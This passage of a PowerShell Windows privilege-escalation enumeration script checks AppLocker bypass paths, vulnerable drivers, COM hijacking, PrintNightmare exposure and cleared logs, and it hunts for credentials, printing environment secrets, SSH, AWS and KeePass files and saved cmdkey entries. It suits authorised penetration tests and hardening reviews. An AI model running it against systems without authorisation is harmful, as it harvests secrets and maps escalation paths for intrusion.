    Write-Finding "`nChecking for vulnerable drivers (BYOVD)..." "Info"
    $driverList = $drivers | Select-Object -ExpandProperty 'Module Name'
    foreach ($vuln in $vulnDrivers) {
        if ($driverList -contains $vuln) {
            Write-Finding "VULNERABLE DRIVER FOUND: $vuln" "Critical"
            Write-Finding "  BYOVD attack possible!" "Critical"
        }
    }
    
} catch {
    Write-Finding "Error checking drivers: $_" "High"
}

# ============================================================================
# APPLOCKER AND WDAC
# ============================================================================
Write-SectionHeader "APPLOCKER AND WDAC"

try {
    Write-Finding "Checking AppLocker..." "Info"
    
    $appLockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
    
    if ($appLockerPolicy) {
        Write-Finding "AppLocker IS configured!" "Info"
        
        foreach ($ruleCollection in $appLockerPolicy.RuleCollections) {
            Write-Finding "`n$($ruleCollection.RuleCollectionType): $($ruleCollection.EnforcementMode)" "Medium"
        }
        
        # Check common bypass paths
        Write-Finding "`nChecking AppLocker bypass paths..." "Info"
        $bypassPaths = @(
            "C:\Windows\Tasks",
            "C:\Windows\Temp",
            "C:\Windows\tracing",
            "C:\Windows\System32\spool\drivers\color",
            "C:\Windows\System32\spool\printers",
            "C:\Windows\System32\spool\servers",
            "C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys",
            "C:\Windows\System32\Tasks",
            "C:\ProgramData"
        )
        
        foreach ($path in $bypassPaths) {
            if (Test-Path $path) {
                try {
                    $testFile = Join-Path $path "test.exe"
                    [System.IO.File]::Create($testFile).Close()
                    Remove-Item $testFile -ErrorAction SilentlyContinue
                    Write-Finding "WRITABLE bypass path: $path" "Critical"
                } catch {}
            }
        }
    } else {
        Write-Finding "AppLocker NOT configured" "Info"
    }
    
    # WDAC check
    Write-Finding "`nChecking WDAC/Device Guard..." "Info"
    $wdac = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
    if ($wdac) {
        Write-Finding "Code Integrity Status: $($wdac.CodeIntegrityPolicyEnforcementStatus)" "Info"
        if ($wdac.CodeIntegrityPolicyEnforcementStatus -eq 0) {
            Write-Finding "  WDAC NOT enforced" "Medium"
        }
    }
    
} catch {
    Write-Finding "Error checking AppLocker/WDAC: $_" "High"
}

# ============================================================================
# FILE SYSTEM TRICKS
# ============================================================================
Write-SectionHeader "FILE SYSTEM TRICKS"

try {
    Write-Finding "Checking for file system tricks..." "Info"
    
    # Symbolic links and junctions
    Write-Finding "`nChecking for symbolic links/junctions:" "Info"
    $commonPaths = @("C:\", "C:\Windows", "C:\Program Files")
    
    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            Get-ChildItem $path -Force -ErrorAction SilentlyContinue | 
                Where-Object {$_.Attributes -match "ReparsePoint"} | 
                Select-Object -First 10 | 
                ForEach-Object {
                    Write-Finding "  Reparse Point: $($_.FullName)" "Medium"
                    try {
                        if ($_.Target) {
                            Write-Finding "    Target: $($_.Target)" "Info"
                        }
                    } catch {}
                }
        }
    }
    
    # Mount points
    Write-Finding "`nChecking mount points..." "Info"
    $volumes = Get-Volume -ErrorAction SilentlyContinue
    if ($volumes) {
        foreach ($vol in $volumes) {
            if ($vol.DriveLetter) {
                Write-Finding "  $($vol.DriveLetter): - $($vol.FileSystemLabel)" "Info"
            }
        }
    }
    
} catch {
    Write-Finding "Error checking file system: $_" "High"
}

# ============================================================================
# ENVIRONMENT VARIABLES
# ============================================================================
Write-SectionHeader "ENVIRONMENT VARIABLES"

try {
    Write-Finding "Checking environment variables..." "Info"
    
    $envVars = Get-ChildItem Env:
    
    # Look for credentials
    foreach ($var in $envVars) {
        if ($var.Name -match "PASSWORD|PWD|SECRET|KEY|TOKEN|API|CREDENTIAL") {
            Write-Finding "Suspicious: $($var.Name) = $($var.Value)" "High"
        }
    }
    
    if ($env:PATH -match "^\.;|;\.;|;\.$") {
        Write-Finding "`nCurrent directory in PATH!" "Critical"
        Write-Finding "  Exploit: DLL hijacking via current directory" "Critical"
    }
    
    Write-Finding "`nAll environment variables:" "Info"
    $envVars | Sort-Object Name | ForEach-Object {
        Write-Finding "  $($_.Name) = $($_.Value)" "Info"
    }
    
} catch {
    Write-Finding "Error checking environment: $_" "High"
}

# ============================================================================
# FIREWALL STATUS
# ============================================================================
Write-SectionHeader "FIREWALL CONFIGURATION"

try {
    Write-Finding "Checking firewall..." "Info"
    
    $profiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    foreach ($profile in $profiles) {
        Write-Finding "`n$($profile.Name) Profile:" "Info"
        Write-Finding "  Enabled: $($profile.Enabled)" "Info"
        
        if (-not $profile.Enabled) {
            Write-Finding "  ^-- FIREWALL DISABLED!" "Critical"
        }
        
        Write-Finding "  Default Inbound: $($profile.DefaultInboundAction)" "Info"
        Write-Finding "  Default Outbound: $($profile.DefaultOutboundAction)" "Info"
    }
    
    # Check open inbound rules
    Write-Finding "`nChecking firewall rules..." "Info"
    $rules = Get-NetFirewallRule -Enabled True -Direction Inbound -ErrorAction SilentlyContinue | Select-Object -First 20
    foreach ($rule in $rules) {
        if ($rule.Action -eq "Allow") {
            $portFilter = Get-NetFirewallPortFilter -AssociatedNetFirewallRule $rule -ErrorAction SilentlyContinue
            if ($portFilter.LocalPort) {
                Write-Finding "  Open: $($rule.DisplayName) - Port $($portFilter.LocalPort)" "Medium"
            }
        }
    }
    
} catch {
    Write-Finding "Error checking firewall: $_" "High"
}

# ============================================================================
# WSL CHECK
# ============================================================================
Write-SectionHeader "WINDOWS SUBSYSTEM FOR LINUX"

try {
    Write-Finding "Checking WSL..." "Info"
    
    $wsl = Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -ErrorAction SilentlyContinue
    
    if ($wsl.State -eq "Enabled") {
        Write-Finding "WSL IS INSTALLED!" "High"
        Write-Finding "  Potential Linux escape vector" "High"
        
        try {
            $distros = wsl.exe -l -v 2>$null
            if ($distros) {
                Write-Finding "`nDistributions:" "High"
                $distros | ForEach-Object { Write-Finding $_ "Info" }
            }
        } catch {}
        
        $wslConfig = "$env:USERPROFILE\.wslconfig"
        if (Test-Path $wslConfig) {
            Write-Finding "WSL config: $wslConfig" "Medium"
        }
    } else {
        Write-Finding "WSL not installed" "Info"
    }
    
} catch {
    Write-Finding "Error checking WSL: $_" "High"
}

# ============================================================================
# JUICY FOLDERS AND FILES
# ============================================================================
Write-SectionHeader "JUICY FOLDERS AND SENSITIVE FILES"

try {
    Write-Finding "Searching sensitive locations..." "Info"
    
    # Desktop
    Write-Finding "`nDesktop files:" "Info"
    Get-ChildItem "$env:USERPROFILE\Desktop" -File -ErrorAction SilentlyContinue | 
        Where-Object {$_.Extension -match "\.txt|\.doc|\.docx|\.xls|\.xlsx|\.key|\.pem|\.ppk|\.pdf"} | 
        Select-Object -First 20 | 
        ForEach-Object {
            Write-Finding "  $($_.Name)" "Medium"
        }
    
    # Downloads
    Write-Finding "`nDownloads folder:" "Info"
    Get-ChildItem "$env:USERPROFILE\Downloads" -File -ErrorAction SilentlyContinue | 
        Where-Object {$_.Extension -match "\.key|\.pem|\.ppk|\.kdbx|\.wallet"} | 
        Select-Object -First 20 | 
        ForEach-Object {
            Write-Finding "  $($_.Name)" "High"
        }
    
    # SSH keys
    if (Test-Path "$env:USERPROFILE\.ssh") {
        Write-Finding "`nSSH directory found!" "High"
        Get-ChildItem "$env:USERPROFILE\.ssh" -File -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Finding "  $($_.Name)" "High"
        }
    }
    
    # AWS credentials
    if (Test-Path "$env:USERPROFILE\.aws") {
        Write-Finding "`nAWS credentials found!" "Critical"
        Get-ChildItem "$env:USERPROFILE\.aws" -File -ErrorAction SilentlyContinue | ForEach-Object {
            Write-Finding "  $($_.Name)" "Critical"
        }
    }
    
    # Azure
    if (Test-Path "$env:USERPROFILE\.azure") {
        Write-Finding "`nAzure CLI credentials found!" "Critical"
    }
    
    # Docker
    if (Test-Path "$env:USERPROFILE\.docker\config.json") {
        Write-Finding "`nDocker config found!" "High"
        Write-Finding "  May contain registry credentials" "High"
    }
    
    # KeePass databases
    Write-Finding "`nSearching for password databases..." "Info"
    Get-ChildItem "$env:USERPROFILE" -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue -Depth 3 | 
        Select-Object -First 10 | 
        ForEach-Object {
            Write-Finding "KeePass DB: $($_.FullName)" "Critical"
        }
    
    # Git credentials
    if (Test-Path "$env:USERPROFILE\.git-credentials") {
        Write-Finding "`nGit credentials found!" "High"
    }
    
    $gitConfig = "$env:USERPROFILE\.gitconfig"
    if (Test-Path $gitConfig) {
        Write-Finding "Git config: $gitConfig" "Medium"
    }
    
} catch {
    Write-Finding "Error searching folders: $_" "High"
}

# ============================================================================
# COM AND DCOM
# ============================================================================
Write-SectionHeader "COM AND DCOM"

try {
    Write-Finding "Checking COM/DCOM..." "Info"
    
    # DCOM configuration
    $dcom = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Ole" -ErrorAction SilentlyContinue
    if ($dcom) {
        Write-Finding "DCOM configured" "Info"
    }
    
    # DCOM applications
    Write-Finding "`nDCOM Applications:" "Info"
    $dcomApps = Get-CimInstance Win32_DCOMApplication -ErrorAction SilentlyContinue | Select-Object -First 20
    foreach ($app in $dcomApps) {
        Write-Finding "  $($app.Name)" "Info"
    }
    
    # Check user CLSID entries
    Write-Finding "`nChecking user-level CLSID entries..." "Info"
    $userCLSID = "HKCU:\Software\Classes\CLSID"
    if (Test-Path $userCLSID) {
        $clsids = Get-ChildItem $userCLSID -ErrorAction SilentlyContinue
        if ($clsids.Count -gt 0) {
            Write-Finding "User CLSID entries: $($clsids.Count)" "Medium"
            Write-Finding "  Potential COM hijacking via user registry" "Medium"
        }
    }
    
    # Check if we can modify system CLSID
    try {
        $systemCLSID = "HKLM:\Software\Classes\CLSID"
        New-ItemProperty -Path $systemCLSID -Name "TestPermission" -Value "test" -ErrorAction Stop | Out-Null
        Remove-ItemProperty -Path $systemCLSID -Name "TestPermission" -ErrorAction SilentlyContinue
        Write-Finding "SYSTEM CLSID registry is WRITABLE!" "Critical"
        Write-Finding "  COM hijacking possible!" "Critical"
    } catch {}
    
} catch {
    Write-Finding "Error checking COM/DCOM: $_" "High"
}

# ============================================================================
# AMSI STATUS
# ============================================================================
Write-SectionHeader "AMSI (ANTI-MALWARE SCAN INTERFACE)"

try {
    Write-Finding "Checking AMSI..." "Info"
    
    $amsiLoaded = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.Location -like "*amsi.dll*"}
    
    if ($amsiLoaded) {
        Write-Finding "AMSI loaded in current process" "Info"
    } else {
        Write-Finding "AMSI not loaded" "Medium"
    }
    
    # AMSI registry
    if (Test-Path "HKLM:\SOFTWARE\Microsoft\AMSI") {
        Write-Finding "AMSI registry key exists" "Info"
    }
    
    # AMSI providers
    $providers = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -ErrorAction SilentlyContinue
    if ($providers) {
        Write-Finding "AMSI Providers: $($providers.Count)" "Info"
        $providers | ForEach-Object {
            Write-Finding "  $($_.PSChildName)" "Info"
        }
    }
    
} catch {
    Write-Finding "Error checking AMSI: $_" "High"
}

# ============================================================================
# EVENT LOGS
# ============================================================================
Write-SectionHeader "EVENT LOG ANALYSIS"

try {
    Write-Finding "Checking event logs..." "Info"
    
    # Try to read Security log
    try {
        $secLog = Get-EventLog -LogName Security -Newest 1 -ErrorAction Stop
        Write-Finding "CAN read Security event log!" "High"
        Write-Finding "  May contain credential information" "High"
    } catch {
        Write-Finding "Cannot read Security log (expected)" "Info"
    }
    
    # Log settings
    $logs = Get-EventLog -List -ErrorAction SilentlyContinue
    foreach ($log in $logs) {
        if ($log.Log -match "Security|System|Application") {
            Write-Finding "`n$($log.Log) Log:" "Info"
            Write-Finding "  Max Size: $($log.MaximumKilobytes) KB" "Info"
            Write-Finding "  Overflow: $($log.OverflowAction)" "Info"
            
            if ($log.OverflowAction -eq "OverwriteAsNeeded") {
                Write-Finding "  ^-- Can be overwritten (evidence loss)" "Medium"
            }
        }
    }
    
    # Check for cleared logs
    Write-Finding "`nChecking for cleared logs..." "Info"
    try {
        $cleared = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102} -MaxEvents 10 -ErrorAction SilentlyContinue
        if ($cleared) {
            Write-Finding "Security log CLEARED recently!" "Critical"
            foreach ($event in $cleared) {
                Write-Finding "  At: $($event.TimeCreated)" "Critical"
            }
        }
    } catch {}
    
    # Audit policy
    Write-Finding "`nAudit Policy:" "Info"
    $auditPol = auditpol /get /category:* 2>$null | Select-String "Success|Failure"
    $auditCount = ($auditPol | Measure-Object).Count
    Write-Finding "Audit settings configured: $auditCount" "Info"
    
    if ($auditCount -lt 10) {
        Write-Finding "  Limited audit coverage" "Medium"
    }
    
} catch {
    Write-Finding "Error checking event logs: $_" "High"
}

# ============================================================================
# SHADOW COPIES (VSS)
# ============================================================================
Write-SectionHeader "SHADOW COPIES (VOLUME SHADOW COPY)"

try {
    Write-Finding "Checking shadow copies..." "Info"
    
    $shadowCopies = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue
    
    if ($shadowCopies) {
        Write-Finding "Shadow copies found: $($shadowCopies.Count)" "High"
        Write-Finding "  May contain old credentials/files!" "High"
        
        foreach ($shadow in $shadowCopies) {
            Write-Finding "`nShadow Copy:" "High"
            Write-Finding "  ID: $($shadow.ID)" "Info"
            Write-Finding "  Volume: $($shadow.VolumeName)" "Info"
            Write-Finding "  Install Date: $($shadow.InstallDate)" "Info"
            Write-Finding "  Device: $($shadow.DeviceObject)" "Info"
        }
        
        Write-Finding "`nAccess via:" "Info"
        Write-Finding "  mklink /d C:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[N]\" "Info"
    } else {
        Write-Finding "No shadow copies found" "Info"
    }
    
    # VSS service
    $vss = Get-Service VSS -ErrorAction SilentlyContinue
    if ($vss) {
        Write-Finding "`nVSS Service: $($vss.Status)" "Info"
    }
    
} catch {
    Write-Finding "Error checking shadow copies: $_" "High"
}

# ============================================================================
# PRINT SPOOLER
# ============================================================================
Write-SectionHeader "PRINT SPOOLER"

try {
    Write-Finding "Checking Print Spooler..." "Info"
    
    $spooler = Get-Service Spooler -ErrorAction SilentlyContinue
    
    if ($spooler) {
        Write-Finding "Status: $($spooler.Status)" "Info"
        Write-Finding "Start Type: $($spooler.StartType)" "Info"
        
        if ($spooler.Status -eq "Running") {
            Write-Finding "`nPrint Spooler RUNNING!" "Critical"
            Write-Finding "  Vulnerable to PrintNightmare (CVE-2021-1675, CVE-2021-34527)" "Critical"
            Write-Finding "  Exploit: Upload malicious DLL via RPC" "Critical"
            
            # Check Point and Print
            $pointAndPrint = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -ErrorAction SilentlyContinue
            
            if ($pointAndPrint) {
                Write-Finding "`nPoint and Print settings:" "Info"
                Write-Finding "  RestrictDriverInstallationToAdministrators: $($pointAndPrint.RestrictDriverInstallationToAdministrators)" "Info"
                Write-Finding "  NoWarningNoElevationOnInstall: $($pointAndPrint.NoWarningNoElevationOnInstall)" "Info"
                
                if ($pointAndPrint.NoWarningNoElevationOnInstall -eq 1) {
                    Write-Finding "  ^-- VERY VULNERABLE to PrintNightmare!" "Critical"
                }
            } else {
                Write-Finding "Point and Print not configured - potentially vulnerable" "High"
            }
        }
    }
    
    # Installed printers
    $printers = Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 10
    if ($printers) {
        Write-Finding "`nInstalled Printers:" "Info"
        foreach ($printer in $printers) {
            Write-Finding "  $($printer.Name) - Port: $($printer.PortName)" "Info"
        }
    }
    
} catch {
    Write-Finding "Error checking Print Spooler: $_" "High"
}

# ============================================================================
# UAC AND SECURITY POLICIES
# ============================================================================
Write-SectionHeader "UAC AND SECURITY POLICIES"

try {
    Write-Finding "Checking security settings..." "Info"
    
    # UAC
    $uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
    
    Write-Finding "`nUAC Settings:" "Info"
    if ($uac.EnableLUA -eq 0) {
        Write-Finding "  UAC is DISABLED!" "Critical"
    } else {
        Write-Finding "  UAC is enabled" "Info"
        Write-Finding "  ConsentPromptBehaviorAdmin: $($uac.ConsentPromptBehaviorAdmin)" "Info"
        Write-Finding "  PromptOnSecureDesktop: $($uac.PromptOnSecureDesktop)" "Info"
    }
    
    # LSA Protection
    $lsa = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue
    Write-Finding "`nLSA Protection:" "Info"
    if ($lsa.RunAsPPL -eq 1) {
        Write-Finding "  ENABLED (RunAsPPL)" "Info"
    } else {
        Write-Finding "  DISABLED - credential dumping easier" "High"
    }
    
    # Credential Guard
    $credGuard = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LsaCfgFlags -ErrorAction SilentlyContinue
    Write-Finding "`nCredential Guard:" "Info"
    if ($credGuard.LsaCfgFlags -ge 1) {
        Write-Finding "  ENABLED" "Info"
    } else {
        Write-Finding "  DISABLED - credentials vulnerable" "High"
    }
    
    # Windows Defender
    try {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defender) {
            Write-Finding "`nWindows Defender:" "Info"
            Write-Finding "  RealTimeProtection: $($defender.RealTimeProtectionEnabled)" "Info"
            Write-Finding "  AntivirusEnabled: $($defender.AntivirusEnabled)" "Info"
            
            if (-not $defender.RealTimeProtectionEnabled) {
                Write-Finding "  ^-- Real-time protection DISABLED!" "High"
            }
        }
    } catch {
        Write-Finding "Windows Defender not available or access denied" "Info"
    }
    
    # PowerShell logging
    Write-Finding "`nPowerShell Security:" "Info"
    $psLogging = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
    if ($psLogging.EnableScriptBlockLogging -eq 1) {
        Write-Finding "  Script Block Logging ENABLED" "Info"
    } else {
        Write-Finding "  Script Block Logging DISABLED" "Medium"
    }
    
    $psTranscription = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue
    if ($psTranscription.EnableTranscripting -eq 1) {
        Write-Finding "  Transcription ENABLED" "Info"
        Write-Finding "    Output: $($psTranscription.OutputDirectory)" "Info"
    } else {
        Write-Finding "  Transcription DISABLED" "Medium"
    }
    
    # WSUS
    Write-Finding "`nWSUS Configuration:" "Info"
    $wsus = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -ErrorAction SilentlyContinue
    if ($wsus.WUServer) {
        if ($wsus.WUServer -match "^http://") {
            Write-Finding "  WSUS using HTTP (no SSL)!" "Critical"
            Write-Finding "  Server: $($wsus.WUServer)" "Critical"
            Write-Finding "  Exploit: MitM attack possible" "Critical"
        } else {
            Write-Finding "  Server: $($wsus.WUServer)" "Info"
        }
    }
    
} catch {
    Write-Finding "Error checking security policies: $_" "High"
}

# ============================================================================
# NETWORK INFORMATION
# ============================================================================
Write-SectionHeader "NETWORK INFORMATION"

try {
    Write-Finding "Network interfaces:" "Info"
    Get-NetIPAddress -ErrorAction SilentlyContinue | Where-Object {$_.AddressFamily -eq "IPv4"} | ForEach-Object {
        Write-Finding "$($_.InterfaceAlias): $($_.IPAddress)" "Info"
    }
    
    Write-Finding "`nActive connections:" "Info"
    Get-NetTCPConnection -ErrorAction SilentlyContinue | 
        Where-Object {$_.State -eq "Established"} | 
        Select-Object -First 25 LocalAddress,LocalPort,RemoteAddress,RemotePort,State | 
        ForEach-Object {
            Write-Finding "$($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)" "Info"
        }
    
    Write-Finding "`nListening ports:" "Info"
    Get-NetTCPConnection -ErrorAction SilentlyContinue | 
        Where-Object {$_.State -eq "Listen"} | 
        Select-Object LocalAddress,LocalPort | 
        ForEach-Object {
            Write-Finding "$($_.LocalAddress):$($_.LocalPort)" "Info"
        }
    
    # ARP table
    Write-Finding "`nARP Table:" "Info"
    $arp = arp -a
    $arp | Select-Object -First 15 | ForEach-Object {
        Write-Finding $_ "Info"
    }
    
    # Routes
    Write-Finding "`nRouting Table:" "Info"
    $routes = Get-NetRoute -ErrorAction SilentlyContinue | Where-Object {$_.DestinationPrefix -ne "ff00::/8"} | Select-Object -First 15
    foreach ($route in $routes) {
        Write-Finding "$($route.DestinationPrefix) -> $($route.NextHop)" "Info"
    }
    
} catch {
    Write-Finding "Error gathering network info: $_" "High"
}

# ============================================================================
# INSTALLED APPLICATIONS
# ============================================================================
Write-SectionHeader "INSTALLED APPLICATIONS"

try {
    Write-Finding "Checking installed applications..." "Info"
    
    $apps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | 
            Where-Object {$_.DisplayName} | 
            Sort-Object DisplayName
    
    Write-Finding "`nInstalled Applications (first 40):" "Info"
    $apps | Select-Object -First 40 | ForEach-Object {
        Write-Finding "$($_.DisplayName) - $($_.DisplayVersion)" "Info"
    }
    
    Write-Finding "`nTotal applications: $($apps.Count)" "Info"
    
    # Check for interesting software
    $interesting = @("python", "git", "putty", "winscp", "filezilla", "vnc", "teamviewer")
    foreach ($keyword in $interesting) {
        $found = $apps | Where-Object {$_.DisplayName -like "*$keyword*"}
        if ($found) {
            Write-Finding "`nFound: $($found.DisplayName)" "Medium"
        }
    }
    
} catch {
    Write-Finding "Error enumerating applications: $_" "High"
}

# ============================================================================
# SAVED CREDENTIALS
# ============================================================================
Write-SectionHeader "SAVED CREDENTIALS"

try {
    Write-Finding "Checking saved credentials..." "Info"
    
    $savedCreds = cmdkey /list 2>$null
    if ($savedCreds -and $savedCreds.Length -gt 0) {
        Write-Finding "Saved credentials found:" "High"
        $savedCreds | ForEach-Object { Write-Finding $_ "High" }
    } else {
        Write-Finding "No saved credentials" "Info"
    }
    
} catch {
    Write-Finding "Error checking credentials: $_" "High"
}

# ============================================================================
# SUMMARY
# ============================================================================
Write-SectionHeader "ENUMERATION COMPLETE"

Write-Finding "Scan completed at $(Get-Date)" "Info"
if ($SaveReport) {
    Write-Finding "Full report saved to: $OutputPath" "Info"
}

Write-Host "`n" -NoNewline
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "IMPORTANT REMINDERS:" -ForegroundColor Yellow
Write-Host "- Always get written authorization" -ForegroundColor Yellow
Write-Host "- This tool is for legal assessments only" -ForegroundColor Yellow
Write-Host "- Document all findings properly" -ForegroundColor Yellow
Write-Host "- Clean up any test files created" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "`n"

Write-Host "Scan Statistics:" -ForegroundColor Cyan
Write-Host "- System Information: Complete" -ForegroundColor Green
Write-Host "- User Privileges: Complete" -ForegroundColor Green
Write-Host "- Services: Complete" -ForegroundColor Green
Write-Host "- Scheduled Tasks: Complete" -ForegroundColor Green
Write-Host "- Credentials: Complete" -ForegroundColor Green
Write-Host "- Network: Complete" -ForegroundColor Green
Write-Host "- Security Policies: Complete" -ForegroundColor Green
Write-Host "- 50+ Privilege Escalation Vectors Checked!" -ForegroundColor Green
Write-Host "`n"
